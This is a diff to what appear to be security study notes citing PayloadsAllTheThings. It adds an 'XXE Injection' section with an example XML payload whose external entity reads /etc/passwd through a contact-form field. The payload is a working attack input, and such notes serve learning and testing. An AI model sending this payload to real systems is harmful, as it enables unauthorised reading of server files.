@@ -1,7 +1,17 @@
-
 ## Resource: https://github.com/swisskyrepo/PayloadsAllTheThings
 
-## XXE
+## XXE Injection
+
+### Example payload:
+
+      <!DOCTYPE foo [
+
+      <!ELEMENT foo ANY >
+
+      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+      <contact><name>&xxe;</name><email>test@mail.com</email><message>whatever</message></contact>
+
 
 | **Code**   | **Description**   |
 | --------------|-------------------|
